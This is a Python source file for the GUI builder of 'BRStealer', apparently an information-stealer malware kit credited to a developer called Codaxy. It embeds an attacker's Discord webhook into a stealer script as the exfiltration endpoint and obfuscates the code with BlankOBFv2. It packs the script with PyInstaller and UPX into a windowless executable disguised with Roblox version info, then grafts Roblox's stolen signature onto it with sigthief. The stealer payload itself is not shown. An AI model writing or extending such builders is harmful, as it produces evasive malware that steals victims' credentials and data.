import logging
import os
import re
import shutil
import webbrowser
from tkinter import messagebox

import customtkinter  # type: ignore
import requests
from PIL import Image

logging.basicConfig(
    level=logging.DEBUG,
    filename="brstealer.log",
    filemode="a",
    format="[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


class App(customtkinter.CTk):
    def __init__(self) -> None:
        super().__init__()  # type: ignore
        self.webhook: str
        self.exename = "Kuruminha"
        self.stealer_modules = [
            "tkinter.messagebox",
        ]

        self.title("BRStealer")
        self.geometry("1000x550")
        self.resizable(width=False, height=False)
        self.iconbitmap("./assets/brazil.ico")  # type: ignore
        customtkinter.set_default_color_theme("green")

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        self.kuruminha = customtkinter.CTkImage(
            Image.open("./assets/kuruminha.png"),
            size=(64, 64),
        )
        self.big_build_image = customtkinter.CTkImage(
            Image.open("./assets/big_build.png"),
            size=(256, 256),
        )
        self.codaxy_icon = customtkinter.CTkImage(
            Image.open("./assets/codaxy.png"),
            size=(128, 128),
        )
        self.build_image = customtkinter.CTkImage(
            light_image=Image.open("./assets/build.png"),
            dark_image=Image.open("./assets/build.png"),
            size=(32, 32),
        )
        self.credits_image = customtkinter.CTkImage(
            light_image=Image.open("./assets/credits.png"),
            dark_image=Image.open("./assets/credits.png"),
            size=(32, 32),
        )
        self.person_image = customtkinter.CTkImage(
            light_image=Image.open("./assets/person.png"),
            dark_image=Image.open("./assets/person.png"),
            size=(32, 32),
        )

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")  # type: ignore
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(
            self.navigation_frame,
            text="  BRStealer",
            image=self.kuruminha,
            compound="left",
            font=customtkinter.CTkFont(size=32, weight="bold"),
        )
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)  # type: ignore

        self.build_button = customtkinter.CTkButton(
            self.navigation_frame,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text="Build",
            fg_color="transparent",
            text_color=("gray10", "gray90"),
            hover_color=("gray70", "gray30"),
            image=self.build_image,
            anchor="w",
            command=self.build_button_event,
            font=customtkinter.CTkFont(size=15),
        )
        self.build_button.grid(row=1, column=0, sticky="ew")  # type: ignore

        self.credits_button = customtkinter.CTkButton(
            self.navigation_frame,
            corner_radius=0,
            height=40,
            border_spacing=10,
            text="Credits",
            fg_color="transparent",
            text_color=("gray10", "gray90"),
            hover_color=("gray70", "gray30"),
            image=self.credits_image,
            anchor="w",
            command=self.credits_button_event,
            font=customtkinter.CTkFont(size=15),
        )
        self.credits_button.grid(row=2, column=0, sticky="ew")  # type: ignore

        self.appearance_mode_menu = customtkinter.CTkOptionMenu(
            self.navigation_frame,
            width=200,
            values=["System", "Dark", "Light"],
            command=self.change_appearance_mode_event,
        )
        self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")  # type: ignore

        # Build Frame
        self.build_frame = customtkinter.CTkFrame(
            self, corner_radius=0, fg_color="transparent"
        )
        self.build_frame.grid_columnconfigure((0, 1), weight=1)

        self.credits_developer_label = customtkinter.CTkLabel(
            self.build_frame,
            text="Build BRStealer",
            font=customtkinter.CTkFont(size=40, weight="bold"),
        )
        self.credits_developer_label.grid(row=0, column=0, columnspan=2, sticky="n", pady=(20, 10))  # type: ignore

        self.image_label = customtkinter.CTkLabel(
            self.build_frame, image=self.big_build_image, text=""
        )
        self.image_label.grid(row=1, column=0, columnspan=2, pady=(10, 20))  # type: ignore

        self.webhook_entry = customtkinter.CTkEntry(
            self.build_frame,
            width=570,
            height=35,
            font=customtkinter.CTkFont(size=15),
            placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz",
        )
        self.webhook_entry.grid(  # type: ignore
            row=2, column=0, columnspan=2, sticky="n", padx=15, pady=20
        )

        button_width: int = self.webhook_entry.cget("width") // 2  # type: ignore

        self.checkwebhook_button = customtkinter.CTkButton(
            master=self.build_frame,
            width=button_width,  # type: ignore
            height=35,
            text="Check Webhook",
            command=self.check_webhook_button,
            font=customtkinter.CTkFont(size=15),
        )
        self.checkwebhook_button.grid(  # type: ignore
            row=3, column=0, sticky="e", padx=(15, 5), pady=10
        )

        self.build_button = customtkinter.CTkButton(
            master=self.build_frame,
            width=button_width,  # type: ignore
            height=35,
            text="Build",
            font=customtkinter.CTkFont(size=15),
            command=self.build_brstealer_exe,
        )
        self.build_button.grid(row=3, column=1, sticky="w", padx=(5, 15), pady=10)  # type: ignore

        # Credits Frame
        self.credits_frame = customtkinter.CTkFrame(
            self, corner_radius=15, fg_color="transparent"
        )
        self.credits_frame.grid_columnconfigure(0, weight=1)

        self.credits_developer_label = customtkinter.CTkLabel(
            self.credits_frame,
            text="Developed By",
            font=customtkinter.CTkFont(size=40, weight="bold"),
        )
        self.credits_developer_label.grid(row=0, column=0, sticky="n", pady=(20, 10))  # type: ignore

        self.credits_developer_icon = customtkinter.CTkLabel(
            self.credits_frame, text="", image=self.codaxy_icon
        )
        self.credits_developer_icon.grid(row=1, column=0, pady=(10, 5))  # type: ignore

        self.credits_developer_name = customtkinter.CTkLabel(
            self.credits_frame,
            text="Codaxy",
            font=customtkinter.CTkFont(size=30, weight="bold"),
        )
        self.credits_developer_name.grid(row=2, column=0, sticky="n", pady=(5, 20))  # type: ignore

        button_font = customtkinter.CTkFont(size=25)

        self.credits_discord_button = customtkinter.CTkButton(
            self.credits_frame,
            text="    Discord",
            width=250,
            height=60,
            font=button_font,
            image=self.person_image,
            compound="left",
            anchor="w",
            command=self.open_discord,
        )
        self.credits_discord_button.grid(row=3, column=0, padx=20, pady=10)  # type: ignore

        self.credits_telegram_button = customtkinter.CTkButton(
            self.credits_frame,
            text="    Telegram",
            width=250,
            height=60,
            font=button_font,
            image=self.person_image,
            compound="left",
            anchor="w",
            command=self.open_telegram,
        )
        self.credits_telegram_button.grid(row=4, column=0, padx=20, pady=10)  # type: ignore

        self.credits_github_button = customtkinter.CTkButton(
            self.credits_frame,
            text="    Github",
            width=250,
            height=60,
            font=button_font,
            image=self.person_image,
            compound="left",
            anchor="w",
            command=self.open_github,
        )
        self.credits_github_button.grid(row=5, column=0, padx=20, pady=10)  # type: ignore

        # Select default frame
        self.select_frame_by_name("build")  # type: ignore

    def select_frame_by_name(self, name: str) -> None:
        self.build_button.configure(  # type: ignore
            fg_color=("gray75", "gray25") if name == "build" else "transparent"
        )
        self.credits_button.configure(  # type: ignore
            fg_color=(
                ("gray75", "gray25") if name == "credits" else "transparent"
            )
        )

        if name == "build":
            self.build_frame.grid(row=0, column=1, sticky="nsew")  # type: ignore
        else:
            self.build_frame.grid_forget()
        if name == "credits":
            self.credits_frame.grid(row=0, column=1, sticky="nsew")  # type: ignore
        else:
            self.credits_frame.grid_forget()

    def build_button_event(self) -> None:
        self.select_frame_by_name("build")

    def credits_button_event(self) -> None:
        self.select_frame_by_name("credits")

    def change_appearance_mode_event(self, new_appearance_mode: str) -> None:
        customtkinter.set_appearance_mode(new_appearance_mode)

    def reset_check_webhook_button_and_entry(self) -> None:
        self.webhook_entry.delete(0, customtkinter.END)  # type: ignore
        self.checkwebhook_button.configure(text="Check Webhook", fg_color="#2FA572", hover_color="#106A43")  # type: ignore
        self.build_frame.focus()

    def open_discord(self) -> None:
        webbrowser.open("https://discordapp.com/users/1289580485659459666/")

    def open_telegram(self) -> None:
        webbrowser.open("https://t.me/virgingod")

    def open_github(self) -> None:
        webbrowser.open("https://github.com/c0d4xy")

    def check_webhook_button(self) -> None:
        if self.verify_webhook():
            self.checkwebhook_button.configure(  # type: ignore
                text="Valid Webhook",
                font=customtkinter.CTkFont(size=15),
            )
            self.webhook = self.webhook_entry.get()
        else:
            self.checkwebhook_button.configure(  # type: ignore
                text="Invalid Webhook",
                fg_color="#bd1616",
                hover_color="#bd1616",
                font=customtkinter.CTkFont(size=15),
            )
            self.build_frame.after(
                2500, self.reset_check_webhook_button_and_entry
            )

    def verify_webhook(self) -> bool:
        webhook = self.webhook_entry.get()
        webhook_pattern = (
            r"https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/\S+"
        )

        try:
            if re.match(webhook_pattern, webhook):
                r = requests.get(webhook, timeout=5)
                if r.status_code == 200:
                    return True
                else:
                    logging.error(
                        f"Webhook not valid. Status code: {r.status_code}. Webhook: {webhook}"
                    )
                    return False
            else:
                logging.error(f"Invalid webhook format: {webhook}")
                return False
        except Exception as e:
            logging.error(f"Couldn't verify webhook: {e}")
            return False

    def replace_webhook(self, webhook: str) -> None:
        logging.debug("Opening file: /src/brstealer.py")

        try:
            with open("./src/brstealer.py", "r", encoding="utf-8") as file:
                lines = file.readlines()

            logging.debug(f"Reading lines from the file: {lines[:5]}")

            for i, line in enumerate(lines):
                if line.strip().startswith("webhook_url ="):
                    logging.debug(f"Replacing line: {line.strip()}")
                    lines[i] = f'webhook_url = "{webhook}"\n'
                    break

            with open("./src/brstealer.py", "w", encoding="utf-8") as file:
                file.writelines(lines)
            logging.debug("File updated successfully.")
        except Exception as e:
            logging.error(f"Error replacing webhook: {e}")
            raise e

    def clean_build_files(self):
        dirs = ["./build"]
        files = [
            f"./{self.exename}.spec",
            f"./src/{self.exename}.py",
            "./tools/upx.exe",
            "./file_version_info.txt",
            f"./dist/{self.exename}.exe",
        ]

        for file in files:
            try:
                if os.path.isfile(file):
                    os.remove(file)
                    logging.debug(f"Successfully removed file: {file}")
            except Exception as e:
                logging.error(f"Couldn't remove directory {file}: {e}")
                pass
                continue

        for dir_ in dirs:
            try:
                if os.path.isdir(dir_):
                    shutil.rmtree(dir_)
                    logging.debug(f"Successfully removed directory: {dir_}")
            except Exception as e:
                logging.error(f"Couldn't remove directory {dir_}: {e}")
                pass
                continue

    def obfuscate_code(self):
        os.system(
            f"python ./tools/BlankOBFv2.py -i ./src/brstealer.py -o ./src/{self.exename}.py"
        )
        logging.debug("Successfully obfuscated code.")

    def sign_exe(self) -> None:
        os.system(
            f"python ./tools/sigthief.py -i ./tools/Roblox.exe -t ./dist/{self.exename}.exe -a -o ./dist/{self.exename}_signed.exe"
        )
        logging.debug("Successfully signed executable.")

    def make_version_file(self) -> None:
        logging.debug("Generating version file.")
        os.system("pyi-grab_version ./tools/Roblox.exe")

    def build_brstealer_exe(self) -> None:
        valid_webhook = self.verify_webhook()
        if valid_webhook:
            try:
                self.replace_webhook(webhook=self.webhook_entry.get())
            except Exception as e:
                messagebox.showerror("Error", "Error replacing webhook. Check 'brstealer.log'.")  # type: ignore
                logging.error(f"Error replacing webhook: {e}")
                return

            messagebox.showinfo("Information", "Build process started. This may take a while...")  # type: ignore
            logging.debug("Build process started.")

            self.obfuscate_code()
            self.make_version_file()

            build_command = f"python -m PyInstaller ./src/{self.exename}.py --upx-dir=./tools/upx --version-file ./file_version_info.txt --noconsole --onefile --icon ./assets/kuruminha.ico"

            for module in self.stealer_modules:
                build_command += f" --hidden-import={module}"

            os.system(build_command)

            self.sign_exe()
            self.clean_build_files()

            messagebox.showinfo("Build Success.", "Build process completed successfully.")  # type: ignore
            logging.debug("Build Success.")
        else:
            messagebox.showerror("Error", "Invalid Webhook.")  # type: ignore


if __name__ == "__main__":
    app = App()
    app.mainloop()  # type: ignore
